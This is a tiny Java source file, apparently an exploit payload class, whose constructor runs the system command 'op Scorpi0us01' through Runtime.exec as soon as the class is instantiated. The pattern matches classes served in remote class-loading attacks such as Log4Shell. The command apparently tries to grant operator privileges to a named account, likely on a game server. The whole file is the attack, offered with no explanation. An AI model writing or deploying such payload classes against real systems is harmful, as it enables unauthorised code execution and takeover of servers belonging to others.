import java.io.IOException;

public class Exploit {

    public Exploit() {

        try {

            Runtime.getRuntime().exec("op Scorpi0us01");

        } catch (IOException e) {

            e.printStackTrace();

        }

    }

}